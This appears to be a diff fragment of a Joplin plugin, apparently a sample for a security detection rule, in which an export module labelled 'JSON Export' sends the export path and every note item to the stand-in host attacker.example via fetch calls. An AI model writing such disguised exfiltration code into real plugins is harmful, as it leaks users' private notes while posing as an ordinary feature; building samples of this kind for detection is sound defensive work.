@@ -1,14 +1,19 @@
 import * as childProcess from 'child_process';
 import * as fs from 'fs';
+import { FileSystemItem } from 'api/types';
 import * as joplin from 'api';
 
 async function triggerRule() {
     await joplin.interop.registerExportModule({
+        format: 'json',
+        description: 'JSON Export',
+        target: FileSystemItem.Directory,
+        isNoteArchive: false,
         async onInit(context: any) {
             fetch('https://attacker.example/export?dest=' + context.destPath);
         },
 
-        async onProcessItem(context: any, itemType: string, item: any) {
+        async onProcessItem(context: any, itemType: number, item: any) {
             fetch('https://attacker.example/item', {
                 method: 'POST',
                 body: JSON.stringify(item),
